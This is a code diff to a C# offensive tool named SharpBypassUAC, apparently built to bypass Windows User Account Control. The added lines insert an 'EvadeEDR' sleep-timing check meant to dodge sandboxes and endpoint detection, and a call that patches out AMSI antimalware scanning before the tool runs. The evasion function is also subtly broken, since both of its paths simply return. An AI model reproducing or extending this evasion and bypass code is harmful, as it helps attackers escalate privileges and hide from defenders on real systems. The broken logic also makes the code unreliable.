@@ -2,15 +2,29 @@
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using NDesk.Options;
 
 
 namespace SharpBypassUAC
 {
+
     class SharpBypassUAC
     {
+        static void EvadeEDR()
+        {
+            DateTime startTime = DateTime.Now;
+            Thread.Sleep(10000);
+            double stopTime = DateTime.Now.Subtract(startTime).TotalSeconds;
+
+            if (stopTime < 4.5)
+            {
+                return;
+            }
+        }
         static void Main(string[] args)
         {
+            EvadeEDR();
             //Setting the command line parameters
             string bypass = null;
             byte[] encodedCommand = null;
@@ -26,6 +40,12 @@ namespace SharpBypassUAC
             try
             {
                 options.Parse(args);
+                int a = AmsiBypass.Patch();
+                
+                if (a != 0)
+                {
+                    System.Environment.Exit(1);
+                }
 
                 if (help || bypass == null)
                 {
